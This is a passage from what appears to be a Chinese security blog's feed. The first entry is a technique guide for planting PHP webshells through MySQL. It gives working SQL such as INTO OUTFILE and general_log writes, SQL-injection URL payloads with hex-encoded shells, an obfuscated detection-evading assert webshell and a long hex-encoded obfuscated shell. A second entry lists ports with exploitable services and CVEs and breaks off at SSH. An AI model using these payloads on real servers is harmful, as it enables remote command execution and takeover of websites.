    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过<code>mysql</code>插入一条<code>php</code>代码记录输出到<code>http</code>服务器工作目录下，通过<code>url</code>传参来交给<code>php</code>系统命令函数来执行获取返回结果，若权限等足够可以直接创建新的账号密码来远程登录</p><p>可以先查看一下<code>mysql</code>的能写的文件 <code>secure_file_priv</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br><span class="line">secure_file_priv的值为null，表示限制mysqld不允许导入/导出</span><br><span class="line">secure_file_priv的值为D:/，表示限制mysqld的导入/导出只能发生在D盘目录下</span><br><span class="line">secure_file_priv没有具体值时，表示不对mysqld的导入/导出做限制</span><br></pre></td></tr></table></figure><h2 id="select-…-into-outfile"><a href="#select-…-into-outfile" class="headerlink" title="select … into outfile"></a>select … into outfile</h2><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>对<code>web</code>目录有写权限</li><li><code>GPC</code>关闭(<code>GPC</code>：是否对单引号转义)</li><li>有绝对路径(读文件可以不用，写文件需要)</li><li>没有配置<code>secure-file-priv</code></li></ul><h3 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h3><ul><li>有<code>union</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php assert($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/home/wwwroot/default/shell.php&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>无<code>union</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">into</span> outfile <span class="string">&#x27;/home/wwwroot/default/shell.php&#x27;</span> fields terminated <span class="keyword">by</span> <span class="string">&#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="general-log"><a href="#general-log" class="headerlink" title="general_log"></a>general_log</h2><p>新版本的<code>MySQL</code>设置了导出文件的路径，很难在获取<code>Webshell</code>过程中去修改配置文件，无法通过使用<code>select into outfile</code>来写入一句话。这时，我们可以通过修改<code>MySQL</code>的<code>log</code>文件来获取<code>Webshell</code>。</p><h3 id="使用条件-1"><a href="#使用条件-1" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>对<code>web</code>目录有写权限</li><li><code>GPC</code>关闭(<code>GPC</code>：是否对单引号转义)</li><li>有绝对路径(读文件可以不用，写文件需要)</li><li>需要能执行多行SQL语句</li></ul><h3 id="姿势-1"><a href="#姿势-1" class="headerlink" title="姿势"></a>姿势</h3><h4 id="常用方式"><a href="#常用方式" class="headerlink" title="常用方式"></a>常用方式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;             #查看配置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;                 #开启general log模式</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;E:/study/WWW/evil.php&#x27;</span>; #设置日志目录为shell地址</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[g]);?&gt;&#x27;</span>             #写入shell</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span>off;                  #关闭general log模式</span><br></pre></td></tr></table></figure><h4 id="免杀shell"><a href="#免杀shell" class="headerlink" title="免杀shell"></a>免杀shell</h4><p>一句话webshell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php $p = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,&#x27;pffff&#x27;=&gt;&#x27;s&#x27;,&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;);$a = array_keys($p);$_=$p[&#x27;pffff&#x27;].$p[&#x27;pffff&#x27;].$a[2];$_= &#x27;a&#x27;.$_.&#x27;rt&#x27;;$_(base64_decode($_REQUEST[&#x27;cmd&#x27;]));?&gt;&quot;</span><br></pre></td></tr></table></figure><p>创建数据表，写入webshell后删除数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `mysql`.`antian365` (`temp` TEXT NOTNULL );</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `mysql`.`antian365` (`temp` ) <span class="keyword">VALUES</span>(<span class="string">&#x27;&lt;?php @eval($_POST[antian365]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> `temp` <span class="keyword">FROM</span> `antian365` <span class="keyword">INTO</span> OUTFILE<span class="string">&#x27;D:/www/antian365.php&#x27;</span>;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `antian365`;</span><br></pre></td></tr></table></figure><p>select unhex(‘十六进制字符串’) into dumpfile file_path，密码==&gt;pp64mqa2x1rnw68</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> unhex(<span class="string">&#x27;203C3F7068700D0A24784E203D2024784E2E737562737472282269796234327374725F72656C6750383034222C352C36293B0D0A246C766367203D207374725F73706C697428226D756B3961773238776C746371222C36293B0D0A24784E203D2024784E2E73756273747228226C396364706C616365704172424539646B222C342C35293B0D0A246A6C203D2073747269706F732822657078776B6C3766363674666B74222C226A6C22293B0D0A2474203D2024742E737562737472282274514756325957774A63567534222C312C36293B0D0A2465696137203D207472696D28226A386C32776D6C34367265656E22293B0D0A2462203D2024622E73756273747228226B6261736536346B424474394C366E6D222C312C36293B0D0A246967203D207472696D28226233397730676E756C6922293B0D0A2479203D2024792E24784E28227259222C22222C22637259726572596122293B0D0A24797531203D207374725F73706C697428226269316238376D3861306F3678222C32293B0D0A2474203D2024742E24784E282278413678222C22222C2277784136786F4A463922293B0D0A246E64203D2073747269706F7328226E363574383872786E303265646A336630222C226E6422293B0D0A2462203D2024622E24784E282277493339222C22222C225F774933396477493339656322293B0D0A2468387073203D207374725F73706C697428226B6E396A3968346D6877676633666A6970222C33293B0D0A2479203D2024792E7375627374722822687974655F66756E775669535645344A222C322C36293B0D0A24796637203D207374726C656E282275656875343967367467356B6F22293B0D0A2474203D2024742E24784E28226670222C22222C22516670546670314E667022293B0D0A246D39203D207374726C656E282265756C363034636F626B22293B0D0A2462203D2024622E73756273747228226C3057316F64656C413165536E454A222C342C33293B0D0A2468306277203D207472696D28226E33653568306371746F6B76676F6238747822293B0D0A2479203D2024792E24784E28227962222C22222C2263796274696F22293B0D0A24733761203D20727472696D2822617565627963396734743564386B22293B0D0A2474203D2024742E7375627374722822624D73306E4268383355577964222C392C34293B0D0A2464353971203D2073747269706F732822636A7675636B6F79357766336F746561222C226435397122293B0D0A2479203D2024792E73756273747228226E4439487851534C386E6752222C392C31293B0D0A246C31203D207374725F73706C697428226167717130396762716E31222C34293B0D0A2474203D2024742E24784E282277366F34222C22222C2277634477366F345977366F343022293B0D0A247079203D2073747269706F7328226C677938687472727631746333222C22707922293B0D0A2474203D2024742E24784E282265503332222C22222C22625846655033326822293B0D0A2478703364203D2073747269706F732822756B6C306E626E7839677433222C227870336422293B0D0A2474203D2024742E7375627374722822696B4A3030484A4D6E677863222C372C35293B0D0A2464743262203D207374726C656E282265346135616275616A7733766C6369726122293B0D0A2474203D2024742E737562737472282263644E314B78656D35334E776D456838364253222C372C34293B0D0A2475626A203D207374726C656E28227767686A6E6674326F70356B7831633038367422293B0D0A2474203D2024742E73756273747228226D34616F7864756A676E58536B63784C344657635964222C372C36293B0D0A247178203D207374726C656E2822726C71666B6B6674726F3867666B6F37796122293B0D0A2474203D2024742E7375627374722822723779222C312C31293B0D0A246D75203D20727472696D28226E676478777578357671653122293B0D0A246A203D2024792822222C20246228247429293B0D0A24626E6C70203D207374726C656E28227675667930616B316679617622293B0D0A24736468203D207374725F73706C69742822776D6E6A766733633770306D222C34293B0D0A246D62203D206C7472696D28226E353270317067616570656F6B6622293B0D0A2465307077203D20727472696D28227575346D686770356339706E613465677122293B0D0A24756768203D207472696D282272637064336F3977393974696F3922293B0D0A246772636B203D207374726C656E2822783572697835627031786B793722293B0D0A24656F3674203D207374726C656E282264646931683134656375797563376422293B246A28293B0D0A2464766E71203D207374725F73706C6974282270726D36676968613176726F333630346175222C38293B0D0A24756738203D20727472696D28226563387735327375706234767538656F22293B0D0A24726374203D2073747269706F73282268786536776F37657764386D65376474222C2272637422293B0D0A24656B7166203D207374725F73706C69742822707266357930386538666C6666773032356A38222C38293B0D0A24767972203D207374725F73706C69742822756D706A63737266673668356E64366F3435222C39293B0D0A24777266203D20727472696D282266797839396F3739333868377567716822293B0D0A24713134203D207374726C656E2822746334366F73786C3173743169633222293B0D0A66756E6374696F6E206F2820297B2020207D3B0D0A24757366203D207374726C656E2822666C7463707862377466626A736D7422293B0D0A3F3E&#x27;</span>) <span class="keyword">into</span> dumpfile <span class="string">&#x27;D:/WEB/IPTEST/22.php&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="利用分隔符写shell"><a href="#利用分隔符写shell" class="headerlink" title="利用分隔符写shell"></a>利用分隔符写shell</h2><p>当MySQL注入点为盲注或报错，<code>union select</code>写入的方式显然是利用不了的，那么可以通过分隔符写入。<code>Sqlmap</code>的<code>--os-shell</code>命令所采用的就是这种方式。</p><h3 id="使用要求"><a href="#使用要求" class="headerlink" title="使用要求"></a>使用要求</h3><ul><li><code>secure_file_priv</code>支持<code>web</code>目录文件导出</li><li>对<code>web</code>目录有写权限</li><li>有绝对路径</li></ul><h3 id="姿势-2"><a href="#姿势-2" class="headerlink" title="姿势"></a>姿势</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 LIMIT 0,1 INTO OUTFILE &#x27;E:/study/WWW/evil.php&#x27; lines terminated by 0x20273c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e27 --</span><br></pre></td></tr></table></figure><p>同样的技巧，一共有四种形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 INTO OUTFILE &#x27;绝对路径&#x27; lines terminated by  （一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;绝对路径&#x27; fields terminated by （一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;绝对路径&#x27; columns terminated by （一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;绝对路径&#x27; lines starting by    （一句话hex编码）#</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;通过&lt;code&gt;mysql&lt;/code&gt;插入一条&lt;code&gt;php&lt;/code&gt;代码记录输出到&lt;code&gt;http&lt;/code&gt;服务器工作目</summary>
      
    
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/categories/WEB/"/>
    
    
    <category term="webshell" scheme="http://lvpsectime.github.io/tags/webshell/"/>
    
    <category term="MySql" scheme="http://lvpsectime.github.io/tags/MySql/"/>
    
  </entry>
  
  <entry>
    <title>端口漏洞备忘录</title>
    <link href="http://lvpsectime.github.io/2020/04/28/%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://lvpsectime.github.io/2020/04/28/%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E%E5%A4%87%E5%BF%98%E5%BD%95/</id>
    <published>2020-04-28T02:17:19.000Z</published>
    <updated>2020-04-28T08:50:06.118Z</updated>
    
    <content type="html"><![CDATA[<p>一些常见的端口对应的服务以及可以利用的漏洞。</p><h2 id="web服务类"><a href="#web服务类" class="headerlink" title="web服务类"></a>web服务类</h2><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80/8080/8009</span><br></pre></td></tr></table></figure><p><strong>常见漏洞：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">manager弱口令</span><br><span class="line">put上传webshell</span><br><span class="line">HTTP慢速攻击</span><br><span class="line">ajr文件包含漏洞-CVE-2020-1938</span><br></pre></td></tr></table></figure><h3 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">后台弱口令</span><br><span class="line">console后台部署war包</span><br><span class="line">JAVA反序列化</span><br><span class="line">远程代码执行</span><br></pre></td></tr></table></figure><h3 id="webSphere"><a href="#webSphere" class="headerlink" title="webSphere"></a>webSphere</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9080</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">后台弱口令</span><br><span class="line">任意文件泄露</span><br><span class="line">JAVA反序列化</span><br></pre></td></tr></table></figure><h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7001/7002</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">后台弱口令</span><br><span class="line">console后台部署war包</span><br><span class="line">SSRF</span><br><span class="line">测试页面上传webshell</span><br><span class="line">JAVA反序列化</span><br><span class="line">CVE-2018-2628</span><br><span class="line">CVE-2018-2893</span><br><span class="line">CVE-2017-10271</span><br><span class="line">CVE-2019-2725</span><br><span class="line">CVE-2019-2729</span><br><span class="line">CVE-2020-2555</span><br></pre></td></tr></table></figure><h3 id="Glassfish"><a href="#Glassfish" class="headerlink" title="Glassfish"></a>Glassfish</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080/4848</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">暴力破解</span><br><span class="line">任意文件读取</span><br><span class="line">认证绕过</span><br></pre></td></tr></table></figure><h3 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">远程共享缓冲区溢出</span><br></pre></td></tr></table></figure><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80/8080</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP慢速攻击</span><br><span class="line">解析漏洞</span><br><span class="line">目录遍历</span><br><span class="line">Apache Solr--8983</span><br><span class="line">远程命令执行</span><br><span class="line">CVE-2017-12629</span><br><span class="line">CVE-2019-0193  </span><br></pre></td></tr></table></figure><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong>                </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">put上传webshell</span><br><span class="line">IIS解析漏洞</span><br><span class="line">IIS提权</span><br><span class="line">IIS远程远程代码执行-CVE-2017-7269</span><br></pre></td></tr></table></figure><h3 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目录遍历</span><br><span class="line">远程文件读取</span><br></pre></td></tr></table></figure><h3 id="Axis2"><a href="#Axis2" class="headerlink" title="Axis2"></a>Axis2</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong>                </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">后台弱口令</span><br></pre></td></tr></table></figure><h3 id="Lutos"><a href="#Lutos" class="headerlink" title="Lutos"></a>Lutos</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1352</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong>                </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">后台弱口令</span><br><span class="line">信息泄露</span><br><span class="line">跨站脚本攻击</span><br></pre></td></tr></table></figure><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80/443</span><br></pre></td></tr></table></figure><p> <strong>常见漏洞</strong>               </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP慢速攻击</span><br><span class="line">解析漏洞</span><br></pre></td></tr></table></figure><h2 id="数据库类"><a href="#数据库类" class="headerlink" title="数据库类"></a>数据库类</h2><h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3306</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">身份认证漏洞-cve-2012-2122</span><br><span class="line">拒绝服务攻击</span><br><span class="line">phpmyadmin万能密码or弱口令</span><br><span class="line">UDF/MOF提权</span><br></pre></td></tr></table></figure><h3 id="Mssql"><a href="#Mssql" class="headerlink" title="Mssql"></a>Mssql</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1433</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">存储过程提权</span><br></pre></td></tr></table></figure><h3 id="Oralce"><a href="#Oralce" class="headerlink" title="Oralce"></a>Oralce</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1521</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">TNS漏洞</span><br></pre></td></tr></table></figure><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6379</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 弱口令</span><br><span class="line">未经授权访问</span><br></pre></td></tr></table></figure><h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5432</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">缓冲区溢出-cve-2014-2669</span><br></pre></td></tr></table></figure><h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">27001</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">未经授权访问</span><br></pre></td></tr></table></figure><h3 id="DB2"><a href="#DB2" class="headerlink" title="DB2"></a>DB2</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5000</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">安全限制绕过进行未经授权操作-cve-2015-1922</span><br></pre></td></tr></table></figure><h3 id="SysBase"><a href="#SysBase" class="headerlink" title="SysBase"></a>SysBase</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5000/4100</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">命令注入</span><br></pre></td></tr></table></figure><h3 id="Memcache"><a href="#Memcache" class="headerlink" title="Memcache"></a>Memcache</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11211</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">未经授权访问</span><br><span class="line">配置漏洞</span><br></pre></td></tr></table></figure><h3 id="ElasticSearch"><a href="#ElasticSearch" class="headerlink" title="ElasticSearch"></a>ElasticSearch</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9200/9300</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">未经授权访问</span><br><span class="line">远程代码执行</span><br><span class="line">文件办理</span><br><span class="line">写入webshell</span><br></pre></td></tr></table></figure><h2 id="大数据类"><a href="#大数据类" class="headerlink" title="大数据类"></a>大数据类</h2><h3 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">50010</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">远程命令执行</span><br></pre></td></tr></table></figure><h3 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2181</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未经授权访问</span><br></pre></td></tr></table></figure><h2 id="文件共享类"><a href="#文件共享类" class="headerlink" title="文件共享类"></a>文件共享类</h2><h3 id="Ftp"><a href="#Ftp" class="headerlink" title="Ftp"></a>Ftp</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong>                </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">匿名访问</span><br><span class="line">上传后门</span><br><span class="line">远程溢出</span><br><span class="line">跳转攻击</span><br></pre></td></tr></table></figure><h3 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2049</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">未经授权访问</span><br><span class="line">Samba--137</span><br><span class="line">弱口令</span><br><span class="line">未经授权访问</span><br><span class="line">远程代码执行-CVE-2015-0240</span><br></pre></td></tr></table></figure><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">389</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">注入</span><br><span class="line">未经授权访问</span><br></pre></td></tr></table></figure><h2 id="远程访问类"><a href="#远程访问类" class="headerlink" title="远程访问类"></a>远程访问类</h2><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22</span><br></pre></td></tr></table></figure><p> 